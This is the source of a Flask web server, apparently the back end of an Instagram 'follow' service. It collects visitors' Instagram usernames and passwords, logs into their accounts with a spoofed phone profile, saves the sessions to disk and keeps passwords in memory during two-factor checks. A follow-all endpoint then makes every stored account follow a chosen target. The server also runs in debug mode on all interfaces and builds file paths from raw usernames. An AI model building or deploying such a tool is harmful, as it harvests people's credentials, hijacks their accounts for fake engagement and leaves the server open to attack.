from flask import Flask, request, jsonify, make_response, send_from_directory
from instagrapi import Client
import uuid, threading, os, json

app = Flask(__name__, static_folder='.', static_url_path='')

pending_sessions = {}
pending_lock = threading.Lock()
logged_in_clients = {}  # SAVED LOGGED IN USERS

# Create folder for sessions
if not os.path.exists("sessions"):
    os.mkdir("sessions")


def make_session_id():
    return uuid.uuid4().hex


# -----------------------------
# Serve index.html (cache bypass)
# -----------------------------
@app.route('/')
def index():
    path = os.path.join(app.root_path, 'index.html')
    with open(path, 'r', encoding='utf-8') as f:
        content = f.read()
    resp = make_response(content)
    resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    return resp


# -----------------------------
# SAVE SESSION
# -----------------------------
def save_session(username, cl):
    session_path = f"sessions/{username}.json"
    cl.dump_settings(session_path)


# -----------------------------
# LOAD SESSION
# -----------------------------
def load_session(username):
    session_path = f"sessions/{username}.json"
    if not os.path.exists(session_path):
        return None

    cl = Client()
    cl.load_settings(session_path)

    try:
        cl.login(username)
        return cl
    except:
        return None


# -----------------------------
# LOGIN API
# -----------------------------
@app.route('/api/login', methods=['POST'])
def login_user():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')

        if not username or not password:
            return jsonify({'error': 'Missing username or password'}), 400

        # ---- Try loading old session first ----
        old_cl = load_session(username)
        if old_cl:
            logged_in_clients[username] = old_cl
            return jsonify({'ok': True, 'message': f'Session Loaded for {username}', 'redirect': '/follow.html'})

        # ---- Normal Login (First Time) ----
        cl = Client()
        cl.set_device({
            "app_version": "289.0.0.20.75",
            "android_version": "30",
            "android_release": "11",
            "dpi": "440dpi",
            "resolution": "1080x2340",
            "manufacturer": "Samsung",
            "device": "SM-G991B",
            "model": "Galaxy S21",
            "cpu": "exynos2100",
            "version_code": "289000020"
        })

        try:
            cl.login(username, password)

            # SAVE SESSION
            save_session(username, cl)

            logged_in_clients[username] = cl
            return jsonify({'ok': True, 'message': f'Login saved for {username}', 'redirect': '/follow.html'})

        except Exception as ex:
            text = str(ex).lower()

            if any(x in text for x in ['two-factor', 'verification_code', 'two factor']):
                session_id = make_session_id()
                with pending_lock:
                    pending_sessions[session_id] = {'username': username, 'password': password}
                return jsonify({'two_factor_required': True, 'session_id': session_id})

            if 'challenge' in text or 'select verify method' in text:
                session_id = make_session_id()
                with pending_lock:
                    pending_sessions[session_id] = {'username': username, 'password': password}
                return jsonify({'challenge_required': True, 'session_id': session_id})

            return jsonify({'error': 'login_failed', 'message': str(ex)}), 500

    except Exception as e:
        return jsonify({'error': 'Unexpected error', 'message': str(e)}), 500


# -----------------------------
# FOLLOW ALL USERS
# -----------------------------
@app.route('/api/follow-all', methods=['POST'])
def follow_all_users():
    try:
        data = request.get_json()
        target_user = data.get("target")

        if not target_user:
            return jsonify({'error': 'Target missing'}), 400
        if not logged_in_clients:
            return jsonify({'error': 'No logged in users'}), 400

        first_cl = next(iter(logged_in_clients.values()))
        target_id = first_cl.user_id_from_username(target_user)

        results = []
        for username, cl in logged_in_clients.items():
            try:
                cl.user_follow(target_id)
                results.append(f"{username} → Followed")
            except Exception as e:
                results.append(f"{username} → Failed: {e}")

        return jsonify({'ok': True, 'results': results})

    except Exception as e:
        return jsonify({'error': 'Unexpected error', 'message': str(e)}), 500


# -----------------------------
# Run Flask
# -----------------------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
